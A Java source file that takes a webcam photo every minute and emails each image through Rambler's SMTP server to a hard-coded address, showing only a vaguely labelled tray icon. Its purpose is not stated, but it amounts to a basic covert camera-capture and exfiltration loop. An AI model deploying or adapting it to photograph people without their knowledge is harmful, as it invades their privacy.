import com.github.sarxos.webcam.Webcam;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.imageio.ImageIO;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.Properties;

public class SendMail implements Runnable {

    private static final String USERNAME = "nicholasg";
    private static final String PASSWORD = "pass";
    private static final String FILE_NAME = "image.jpg";
    private static final int SECOND = 1000;
    private static final int MINUTE = SECOND * 60;

    public static void main( String[] args ) throws InterruptedException, IOException {
        new SendMail().run();
    }

    private static void toTray() throws IOException {
        final PopupMenu popup = new PopupMenu();
        Image image = ImageIO.read( new File( "bs.png" ) );
        final TrayIcon trayIcon =
                new TrayIcon( image, "www" );
        final SystemTray tray = SystemTray.getSystemTray();

        // Create a pop-up menu components
        MenuItem exitItem = new MenuItem( "Exit" );

        // Add components to pop-up menu
        popup.add( exitItem );

        trayIcon.setPopupMenu( popup );

        try {
            tray.add( trayIcon );
        } catch ( AWTException e ) {
            System.out.println( "TrayIcon could not be added." );
        }
    }

    private static void sendMessage( Session session ) throws MessagingException, IOException {
        Message message = new MimeMessage( session );
        message.setFrom( new InternetAddress( "nicholasg@rambler.ru" ) );
        message.setRecipients( Message.RecipientType.TO,
                InternetAddress.parse( "nicholasg@rambler.ru" ) );
        message.setSubject( "Testing" );
        message.setText( "Kartinkaaaa\n" );

        Multipart multipart = new MimeMultipart();
        BodyPart messageBodyPart = new MimeBodyPart();

        getImage();
        DataSource source = new FileDataSource( FILE_NAME );
        messageBodyPart.setDataHandler( new DataHandler( source ) );
        messageBodyPart.setFileName( FILE_NAME );
        multipart.addBodyPart( messageBodyPart );

        message.setContent( multipart );

        Transport.send( message );
    }

    private static void getImage() throws IOException {
        Webcam webcam = Webcam.getDefault();
        webcam.setCustomViewSizes( new Dimension[]{ new Dimension( 1280, 720 ) } );
        webcam.setViewSize( new Dimension( 1280, 720 ) );
        webcam.open();

        BufferedImage image = webcam.getImage();
        webcam.close();

        ImageIO.write( image, "JPG", new File( FILE_NAME ) );
    }

    @Override
    public void run() {
        Properties props = new Properties();
        props.put( "mail.smtp.starttls.enable", "true" );
        props.put( "mail.smtp.auth", "true" );
        props.put( "mail.smtp.host",  "smtp.rambler.ru" );
        props.put( "mail.smtp.port", "587" );

        new Thread( () -> {
            try {
                toTray();
            } catch ( IOException e ) {
                e.printStackTrace();
            }
        } ).start();

        new Thread( () -> {
            while ( true ) {
                Session session = Session.getInstance( props,
                        new Authenticator() {
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication( USERNAME, PASSWORD );
                            }
                        } );
                try {
                    sendMessage( session );
                    Thread.sleep( MINUTE );
                } catch ( MessagingException e ) {
                    JOptionPane.showMessageDialog( null, e.getMessage() );
                    return;
                } catch ( InterruptedException | IOException e ) {
                    e.printStackTrace();
                }
            }
        } ).start();
    }
}
